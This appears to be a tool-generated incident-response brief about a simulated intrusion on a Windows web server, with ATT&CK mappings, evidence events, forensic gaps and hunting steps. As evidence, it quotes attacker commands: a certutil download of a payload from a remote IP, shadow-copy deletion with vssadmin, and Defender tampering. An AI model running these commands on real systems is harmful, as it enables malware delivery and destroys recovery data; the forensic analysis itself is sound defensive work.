summary:
INCIDENT BRIEF — WEB-03    Severity: Critical

A hands-on-keyboard intrusion with established persistence, active C2, and deliberate anti-forensics. Treat as a confirmed compromise.

Key findings:
  • Initial execution via encoded PowerShell at 2026-05-02T09:11:00Z.
  • Living-off-the-land binary abuse: certutil, rundll32 (3 command(s)).
  • Obfuscated/fileless execution: 4 command(s) flagged (1 base64-decoded).
  • Anomalous process lineage: web server w3wp.exe spawned cmd.exe (web shell).
  • 2 suspicious persistence mechanism(s) (Run key / service).
  • 1 scheduled task(s) created for persistence.
  • Local account(s) created: supportadmin.
  • Outbound command-and-control to 203.0.113.45.
  • Removable USB storage attached — potential exfiltration vector.
  • Anti-forensics: Defender tampering (Set-MpPreference -Disable...); Security audit log cleared; USN change-journal deletion; VSS shadow-copy deletion.
  • Timestomping detected on 1 file(s) (SI vs FN $MFT timestamps disagree).
  • 1 deleted file record(s) for suspect binaries recovered from $MFT (InUse=false).

ATT&CK: 22 techniques across 7 tactics (T1059.001, T1547.001, T1543.003, T1053.005, T1136.001, T1036.005, T1218.011, T1562.001, T1070.001, T1071.001, T1052.001, T1546.003, T1105, T1204.002, T1059.003, T1505.003, T1140, T1027, T1490, T1070, T1070.004, T1070.006).

rootcause.root_cause: Most likely root cause: a malicious executable (svchost.exe) downloaded through the web browser (http://cdn.example-update.test/svchost.exe) at 2026-05-02T09:10:00Z, then executed on the host. The dropper was first written to disk at 2026-05-02T09:10:05Z.
rootcause.summary: Confirmed compromise of WEB-03: a 6-phase intrusion spanning 22 ATT&CK techniques. Most likely root cause: a malicious executable (svchost.exe) downloaded through the web browser (http://cdn.example-update.test/svchost.exe) at 2026-05-02T09:10:00Z, then executed on the host. The dropper was first written to disk at 2026-05-02T09:10:05Z.

chain.title: Persistence established
evidence: 2026-05-02T09:13:00Z event 7045 — A new service was installed: FakeSvc
2026-05-02T09:16:00Z event 4720 — A user account was created: supportadmin

chain.title: Command-and-control
evidence: 2026-05-02T09:10:30Z WEB-03 [event 4688]: certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\Users\Public\p.exe [certutil URLCache download]

chain.title: Impact
evidence: 2026-05-02T09:38:30Z WEB-03 [event 4688]: vssadmin.exe delete shadows /all /quiet [VSS shadow-copy deletion]

gaps: Visibility gap: Security audit log cleared at 2026-05-02T09:40:00Z on WEB-03; events before this are unavailable on-host — recover from forwarded logs / SIEM.
Volume Shadow Copies were deleted (T1490); on-host point-in-time recovery and $MFT/$LogFile carving from snapshots are no longer available.
The USN change journal was deleted (T1070); recent file create/rename/delete history is unrecoverable from the journal — rely on $MFT and forwarded telemetry.
Timestomping detected (T1070.006) on: C:\Windows\System32\drivers\update.sys — SI vs FN $MFT timestamps disagree, so on-disk MAC times are unreliable; pivot on FN (0x30) times instead.
Deleted $MFT record(s) for suspect file(s) (T1070.004): C:\Users\Public\stage2.exe (InUse=false) — the attacker deleted the dropper; carve resident data from $MFT/$LogFile.
C2 was observed as a live socket; pull proxy/DNS/firewall logs to scope the connection's duration and any data transferred.
File-system timeline confirms the dropper's first write: C:\Users\jdoe\Downloads\svchost.exe at 2026-05-02T09:10:05Z (corroborate against $MFT $LogFile for resident-file recovery).
WMI event-subscription persistence (T1546.003) was found; enumerate the whole root\subscription namespace fleet-wide — it commonly survives reimaging of user data.
pivots: Hunt the fleet for any other host communicating with 203.0.113.45.
Block http://198.51.100.23/p.exe at the proxy and hunt other hosts that fetched it.
Block http://198.51.100.23/stage.ps1 at the proxy and hunt other hosts that fetched it.
Block http://203.0.113.45/a at the proxy and hunt other hosts that fetched it.
Block http://cdn.example-update.test/svchost.exe at the proxy and hunt other hosts that fetched it.
Acquire and analyze the binary at C:\Users\Public\d.dll (hash, sandbox detonation, YARA).
Acquire and analyze the binary at C:\Users\Public\stage2.exe (hash, sandbox detonation, YARA).
Acquire and analyze the binary at C:\Users\Public\svchost.exe (hash, sandbox detonation, YARA).
Audit logon history and group membership for account 'supportadmin' domain-wide.
Remove the malicious WMI subscription (Remove-WmiObject on the filter, consumer, and binding) and sweep the fleet for the same consumer name.
Submit collected hashes to threat intel and block at EDR.

intents.example: Map this incident to MITRE ATT&CK.
intents.text: Mapped 22 ATT&CK technique(s) across 7 tactic(s): T1059.001 Command and Scripting Interpreter: PowerShell (Execution); T1547.001 Boot or Logon Autostart: Registry Run Keys (Persistence/Privilege Escalation); T1543.003 Create or Modify System Process: Windows Service (Persistence/Privilege Escalation); T1053.005 Scheduled Task/Job: Scheduled Task (Execution/Persistence/Privilege Escalation); T1136.001 Create Account: Local Account (Persistence); T1036.005 Masquerading: Match Legitimate Name or Location (Defense Evasion); T1218.011 System Binary Proxy Execution: Rundll32 (Defense Evasion); T1562.001 Impair Defenses: Disable or Modify Tools (Defense Evasion); T1070.001 Indicator Removal: Clear Windows Event Logs (Defense Evasion); T1071.001 Application Layer Protocol: Web Protocols (Command and Control); T1052.001 Exfiltration Over Physical Medium: USB (Exfiltration); T1546.003 Event Triggered Execution: WMI Event Subscription (Persistence/Privilege Escalation); T1105 Ingress Tool Transfer (Command and Control); T1204.002 User Execution: Malicious File (Execution); T1059.003 Command and Scripting Interpreter: Windows Command Shell (Execution); T1505.003 Server Software Component: Web Shell (Persistence); T1140 Deobfuscate/Decode Files or Information (Defense Evasion); T1027 Obfuscated Files or Information (Defense Evasion); T1490 Inhibit System Recovery (Impact); T1070 Indicator Removal (Defense Evasion); T1070.004 Indicator Removal: File Deletion (Defense Evasion); T1070.006 Indicator Removal: Timestomp (Defense Evasion).
